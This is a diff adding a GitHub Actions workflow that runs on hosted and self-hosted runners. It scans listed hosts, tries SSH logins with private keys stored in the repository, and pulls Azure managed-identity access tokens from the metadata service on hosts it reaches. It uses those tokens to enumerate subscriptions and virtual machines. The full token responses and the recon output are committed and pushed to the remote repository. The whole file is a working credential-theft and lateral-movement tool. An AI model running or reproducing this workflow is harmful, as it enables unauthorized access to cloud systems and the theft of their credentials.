@@ -1,0 +1,134 @@
+name: ularm8094
+on:
+  push:
+    paths: ['trigger/arm8094*']
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  hosted:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: hunt
+        shell: bash
+        run: |
+          set -u
+          D=arm2; mkdir -p $D; R=$D/report.txt; : > $R
+          log(){ echo "$@" >> $R; }
+          CIDS="2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 621dcd44-3c72-4105-b862-301a105412af b9590f55-e173-495c-9010-15beb8611a43 25c1dc23-3925-49f1-94d3-4e702da5fa9b"
+          SUB=21bcfd92-9348-4285-a51e-815d6e56bddf
+          log "START $(date -u) host=$(hostname) runner=${RUNNER_NAME:-hosted}"
+          for k in az/ibm_key.pem az/azadmin.pem; do
+            if [ -f "$k" ]; then install -m600 "$k" /tmp/$(basename $k); log "KEY $k sha8=$(sha256sum $k | cut -c1-8)"; fi
+          done
+          log "IMDS_SELF $(curl -s -m 4 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01' | head -c 120)"
+          : > $D/live.txt
+          while IFS=$'\t' read -r name ip user region sku; do
+            [ -z "${name:-}" ] && continue
+            for p in 22 443; do
+              if timeout 5 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null; then
+                echo -e "$name\t$ip\t$p\tOPEN" >> $D/live.txt
+              fi
+            done
+          done < az/hosts.tsv
+          log "PROBE_OPEN $(wc -l < $D/live.txt)"
+          cat $D/live.txt >> $R
+          : > $D/tokens.txt
+          awk -F'\t' '$3==22{print $1"|"$2}' $D/live.txt | while IFS='|' read -r name ip; do
+            for key in /tmp/ibm_key.pem /tmp/azadmin.pem; do
+              [ -f "$key" ] || continue
+              for u in t19 ubuntu azureuser; do
+                if timeout 20 ssh -i $key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 "$u@$ip" 'true' 2>/dev/null; then
+                  echo "SSH_OK $name $ip $u $(basename $key)" >> $D/ssh_ok.txt
+                  log "SSH_OK $name $ip $u $(basename $key)"
+                  {
+                    echo "===== $name $ip as $u key=$(basename $key) $(date -u)"
+                    timeout 40 ssh -i $key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 "$u@$ip" \
+                      'id; hostname; uname -m; nvidia-smi -L 2>&1 | head -4; ls -l /dev/nvidia* 2>&1 | head -4; echo "--imds--"; curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 900; echo' 2>&1
+                    for cid in $CIDS; do
+                      T=$(timeout 25 ssh -i $key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 "$u@$ip" \
+                        "curl -s -m 10 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F&client_id=$cid'" 2>/dev/null)
+                      echo "TOK cid=$cid len=${#T} head=$(echo "$T" | head -c 120)" >> $D/tokens.txt
+                      case "$T" in *access_token*) echo "$T" > $D/tok_$cid.json; echo "$T" >> $D/tokens_full.txt;; esac
+                    done
+                  } >> $D/$name.txt
+                fi
+              done
+            done
+          done
+          log "TOKENS:"; cat $D/tokens.txt >> $R 2>/dev/null || true
+          # ARM: use first token we got
+          ARM=""
+          if [ -f $D/tokens_full.txt ]; then
+            ARM=$(python3 -c "import json,sys;print(json.load(open('$D/tokens_full.txt')).get('access_token',''))" 2>/dev/null || true)
+          fi
+          if [ -z "$ARM" ] && [ -d $D ]; then
+            for f in $D/tok_*.json; do [ -f "$f" ] && ARM=$(python3 -c "import json;print(json.load(open('$f')).get('access_token',''))" 2>/dev/null) && [ -n "$ARM" ] && break; done
+          fi
+          log "ARM_TOKEN len=${#ARM}"
+          if [ -n "$ARM" ]; then
+            H="Authorization: Bearer $ARM"
+            log "SUBS $(curl -s -m 20 -H "$H" 'https://management.azure.com/subscriptions?api-version=2022-12-01' | head -c 600)"
+            curl -s -m 40 -H "$H" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&\$expand=instanceView" -o $D/vms.json
+            log "VMS_BYTES $(wc -c < $D/vms.json)"
+            python3 - <<'PY' >> $R
+          import json,os
+          try:
+              d=json.load(open('arm2/vms.json'))
+          except Exception as e:
+              print('VMS_PARSE_ERR',e); raise SystemExit
+          vs=d.get('value',[])
+          print('VM_COUNT',len(vs))
+          for v in vs:
+              st=''
+              for s in (v.get('properties',{}).get('instanceView',{}) or {}).get('statuses',[]) or []:
+                  if s.get('code','').startswith('PowerState'): st=s['code']
+              print('VM',v.get('name'),v.get('location'),v.get('properties',{}).get('hardwareProfile',{}).get('vmSize'),st)
+          PY
+            curl -s -m 40 -H "$H" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Compute/virtualMachineScaleSets?api-version=2023-09-01" -o $D/vmss.json
+            log "VMSS_BYTES $(wc -c < $D/vmss.json)"
+            head -c 800 $D/vmss.json >> $R; echo >> $R
+          fi
+          git config user.email ul@local; git config user.name ul
+          git add -A arm2 || true
+          git -c user.email=ul@local -c user.name=ul commit -qm "arm2 $(date -u)" || true
+          git push origin HEAD:main || true
+  selfhost:
+    runs-on: [self-hosted, Linux]
+    continue-on-error: true
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: hunt2
+        shell: bash
+        run: |
+          set -u
+          D=arm2s; mkdir -p $D; R=$D/report.txt; : > $R
+          echo "START $(date -u) host=$(hostname)" >> $R
+          echo "IMDS $(curl -s -m 4 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01' | head -c 120)" >> $R
+          : > $D/live.txt
+          while IFS=$'\t' read -r name ip user region sku; do
+            [ -z "${name:-}" ] && continue
+            for p in 22 443; do
+              if timeout 5 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null; then echo -e "$name\t$ip\t$p\tOPEN" >> $D/live.txt; fi
+            done
+          done < az/hosts.tsv
+          echo "PROBE_OPEN $(wc -l < $D/live.txt)" >> $R; cat $D/live.txt >> $R
+          for k in az/ibm_key.pem az/azadmin.pem; do [ -f "$k" ] && { install -m600 "$k" /tmp/$(basename $k) 2>/dev/null || cp "$k" /tmp/$(basename $k); }; done
+          awk -F'\t' '$3==22{print $1"|"$2}' $D/live.txt | while IFS='|' read -r name ip; do
+            for key in /tmp/ibm_key.pem /tmp/azadmin.pem; do
+              [ -f "$key" ] || continue
+              for u in t19 ubuntu azureuser; do
+                if timeout 20 ssh -i $key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 "$u@$ip" 'true' 2>/dev/null; then
+                  { echo "===== $name $ip $u $(basename $key)"; timeout 40 ssh -i $key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes "$u@$ip" 'id; hostname; nvidia-smi -L 2>&1|head -3; curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 700'; } >> $D/$name.txt
+                  echo "SSH_OK $name $ip $u $(basename $key)" >> $R
+                fi
+              done
+            done
+          done
+          git config user.email ul@local; git config user.name ul
+          git add -A arm2s || true
+          git commit -qm "arm2s $(date -u)" || true
+          git push origin HEAD:main || true
